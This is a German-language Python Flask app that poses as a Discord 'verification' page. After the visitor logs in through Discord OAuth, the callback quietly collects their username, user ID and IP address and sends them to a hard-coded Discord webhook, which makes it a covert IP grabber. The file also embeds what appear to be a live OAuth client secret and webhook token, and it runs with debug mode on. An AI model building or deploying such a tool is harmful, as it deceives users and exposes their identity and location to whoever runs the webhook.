from flask import Flask, render_template_string, request
import requests

app = Flask(__name__)

# =========================
# KONFIGURATION
# =========================
CLIENT_ID = "1450158332412166367"
CLIENT_SECRET = "E87qoqo2rNcIkKITyFK4KMKcqyDfynUV"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1450216273970724895/R-Y1jdCcap4ZKVXxyiITQOQ1lM38jQ5PCVr50-xlwna8J4OIvjQhrN_nB0pc9vBAS-k_"

REDIRECT_URI = "http://localhost:5000/callback"

DISCORD_AUTH_URL = (
    "https://discord.com/oauth2/authorize"
    f"?client_id={CLIENT_ID}"
    "&response_type=code"
    "&scope=identify"
    f"&redirect_uri={REDIRECT_URI}"
)

# =========================
# HTML SEITE
# =========================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Discord Verifizierung</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(to bottom, #00111a, #003366);
            font-family: Arial, sans-serif;
            color: white;
        }
        .container {
            text-align: center;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            border: none;
            background-color: #5865F2;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #4752C4;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Discord Verifizierung</h1>
        <p>Klicke auf den Button um dich zu verifizieren</p>
        <a href="{{ auth_url }}">
            <button>Mit Discord verifizieren</button>
        </a>
    </div>
</body>
</html>
"""

# =========================
# ROUTES
# =========================
@app.route("/")
def index():
    return render_template_string(HTML, auth_url=DISCORD_AUTH_URL)

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "Kein Code erhalten", 400

    # Token holen
    token_response = requests.post(
        "https://discord.com/api/oauth2/token",
        data={
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )

    token_data = token_response.json()
    access_token = token_data.get("access_token")

    if not access_token:
        return "Token Fehler", 400

    # Userdaten holen
    user_response = requests.get(
        "https://discord.com/api/users/@me",
        headers={"Authorization": f"Bearer {access_token}"}
    )

    user = user_response.json()

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    msg = (
        "✅ **Neue Verifizierung**\n"
        f"👤 User: {user['username']}#{user['discriminator']}\n"
        f"🆔 ID: {user['id']}\n"
        f"🌍 IP: {ip}"
    )

    # Nachricht an Discord senden
    requests.post(DISCORD_WEBHOOK, json={"content": msg})

    return "<h2 style='text-align:center;margin-top:40px;'>Erfolgreich verifiziert ✅</h2>"

# =========================
# START
# =========================
if __name__ == "__main__":
    app.run(debug=True)
